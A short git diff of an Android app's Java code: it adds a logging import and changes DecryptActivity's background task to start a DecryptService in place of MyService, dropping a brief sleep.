@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.SystemClock;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -14,6 +15,7 @@ import android.widget.TextView;
 import alepacheco.com.rw.R;
 import alepacheco.com.rw.apl.Helper;
 import alepacheco.com.rw.persistence.LocalStorage;
+import alepacheco.com.rw.services.DecryptService;
 import alepacheco.com.rw.services.MyService;
 
 /**
@@ -69,8 +71,7 @@ public class DecryptActivity extends Activity{
 
     private class RunService extends AsyncTask<Context, Void, Void> {
         protected Void doInBackground(Context... parms) {
-            SystemClock.sleep(500);
-            Intent srv = new Intent(parms[0], MyService.class);
+            Intent srv = new Intent(parms[0], DecryptService.class);
             startService(srv);
             return null;
         }
